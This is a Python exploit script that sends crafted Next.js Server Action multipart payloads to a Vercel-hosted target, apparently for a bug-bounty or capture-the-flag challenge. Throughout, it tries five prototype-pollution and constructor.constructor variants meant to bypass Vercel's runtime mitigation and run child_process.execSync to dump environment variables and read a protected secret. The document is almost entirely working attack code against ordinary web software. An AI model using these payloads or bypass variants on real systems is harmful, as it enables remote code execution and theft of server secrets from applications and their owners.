#!/usr/bin/env python3
"""
Bypass Vercel's runtime mitigation using alternative syntax
Based on Lachlan's finding: use constructor.constructor instead of :constructor:constructor
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def exploit_variant(payload_structure, desc=""):
    """
    Test different payload structures
    """
    print(f"\n[*] Testing: {desc}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    body = f'------{boundary}\r\n'

    for i, (name, value) in enumerate(payload_structure):
        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
        if isinstance(value, dict) or isinstance(value, list):
            body += json.dumps(value) + '\r\n'
        else:
            body += value + '\r\n'
        body += f'------{boundary}\r\n' if i < len(payload_structure) - 1 else f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=20)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text}")

        # Check for flag in response
        if "VERCEL_PLATFORM_PROTECTION" in response.text or (response.status_code == 200 and "Hello World" not in response.text):
            print("\n[!!!] POTENTIAL FLAG FOUND!")
            return True

        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

print("="*70)
print("Runtime Mitigation Bypass Attempts")
print("="*70)

# Variant 1: Use dot notation instead of colon
payload1 = [
    ("0", {
        "then": "$1.__proto__.then",  # Dot instead of colon
        "status": "resolved_model",
        "reason": -1,
        "_response": {
            "_prefix": "process.env.VERCEL_PLATFORM_PROTECTION",
            "_formData": {
                "get": "$1.constructor.constructor"  # Dot instead of colon
            }
        }
    }),
    ("1", '"$@0"')
]
exploit_variant(payload1, "Dot notation instead of colon")

# Variant 2: Use array index access
payload2 = [
    ("0", {
        "then": "$1['__proto__']['then']",
        "status": "resolved_model",
        "_response": {
            "_prefix": "process.env.VERCEL_PLATFORM_PROTECTION",
            "_formData": {
                "get": "$1['constructor']['constructor']"
            }
        }
    }),
    ("1", '"$@0"')
]
exploit_variant(payload2, "Array index access")

# Variant 3: Try without __proto__, go directly through constructor
payload3 = [
    ("0", {
        "then": "$1:then",
        "status": "resolved_model",
        "_response": {
            "_prefix": "process.env.VERCEL_PLATFORM_PROTECTION",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }),
    ("1", '"$@0"')
]
exploit_variant(payload3, "Direct constructor without __proto__")

# Variant 4: Use different property access pattern
payload4 = [
    ("0", '$F1#child_process#execSync'),
    ("1", ["env | grep VERCEL_PLATFORM_PROTECTION"])
]
exploit_variant(payload4, "Module reference with execSync")

# Variant 5: Try the original lachlan2k POC format exactly
payload5 = [
    ("0", {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": 'process.mainModule.require("child_process").execSync("env").toString()',
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }),
    ("1", '"$@0"'),
    ("2", [])
]
exploit_variant(payload5, "Original lachlan2k format with 3 fields")

print("\n" + "="*70)
